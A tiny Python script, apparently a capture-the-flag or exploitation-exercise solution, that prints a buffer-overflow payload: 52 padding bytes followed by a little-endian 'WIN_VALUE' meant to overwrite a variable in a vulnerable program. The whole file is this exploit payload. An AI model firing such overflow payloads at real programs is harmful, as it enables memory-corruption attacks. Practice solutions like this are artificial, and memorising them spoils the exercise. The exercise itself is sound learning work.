import sys

WIN_VALUE = 0x05ad2f20
payload = b"A" * 52 + WIN_VALUE.to_bytes(4, "little")
sys.stdout.buffer.write(payload)
